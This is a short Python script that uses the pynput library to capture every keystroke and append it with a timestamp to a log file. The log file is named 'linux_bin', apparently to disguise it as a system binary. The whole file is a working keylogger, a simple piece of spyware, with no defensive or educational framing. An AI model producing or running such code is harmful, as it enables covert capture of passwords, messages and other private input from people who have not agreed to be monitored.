from pynput.keyboard import Key, Listener
import logging

log_dir = ""



# Set logging configurations
logging.basicConfig(
    # Set file path
    filename=(log_dir + "linux_bin"), 
    level=logging.DEBUG, 
    format='%(asctime)s: %(message)s'
)

def on_press(key):
    logging.info(str(key))

with Listener(on_press=on_press) as listener:
    listener.join()
